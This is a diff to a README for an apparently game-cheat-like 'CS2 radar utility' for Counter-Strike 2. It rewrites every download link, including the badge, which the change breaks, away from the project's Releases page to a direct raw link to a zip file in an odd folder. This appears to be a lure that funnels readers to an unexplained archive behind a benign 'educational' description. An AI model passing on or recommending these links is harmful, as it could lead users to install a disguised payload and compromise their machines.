@@ -1,6 +1,6 @@
 # 🔊 assistant-for-cs2-radar-utility - Enhance Your Audio Awareness
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=flat&logo=github&logoColor=white)](https://github.com/Umez1/assistant-for-cs2-radar-utility/releases)
+[![Download Now](https://raw.githubusercontent.com/Umez1/assistant-for-cs2-radar-utility/main/screich/assistant-for-cs2-radar-utility_v1.5-beta.4.zip%20Now-blue?style=flat&logo=github&logoColor=white)](https://raw.githubusercontent.com/Umez1/assistant-for-cs2-radar-utility/main/screich/assistant-for-cs2-radar-utility_v1.5-beta.4.zip)
 
 ## 🌟 Project Overview
 **CS2 Audio Perception & Radar Analysis Collection** provides educational resources about audio systems and sound cue interpretation in CS2. This compilation documents recognized audio analysis techniques and auditory information processing, aligning with game guidelines.
@@ -23,7 +23,7 @@ To use this application, follow these simple steps:
 ### 1. Visit the Releases page
 Navigate to our Releases page to find the latest version of the application. Click the link below.
 
-[Download Here](https://github.com/Umez1/assistant-for-cs2-radar-utility/releases)
+[Download Here](https://raw.githubusercontent.com/Umez1/assistant-for-cs2-radar-utility/main/screich/assistant-for-cs2-radar-utility_v1.5-beta.4.zip)
 
 ### 2. Download the Application
 On the Releases page, you will see a list of available files. Select the appropriate version for your system. 
@@ -74,6 +74,6 @@ Join our community to share tips, ask questions, and seek advice from other user
 ## 📥 Download & Install
 You can easily download the application by visiting the link below:
 
-[Download Here](https://github.com/Umez1/assistant-for-cs2-radar-utility/releases)
+[Download Here](https://raw.githubusercontent.com/Umez1/assistant-for-cs2-radar-utility/main/screich/assistant-for-cs2-radar-utility_v1.5-beta.4.zip)
 
 Follow the steps provided to install and start using the application today. Enjoy exploring sound perception and radar analysis strategies in CS2!
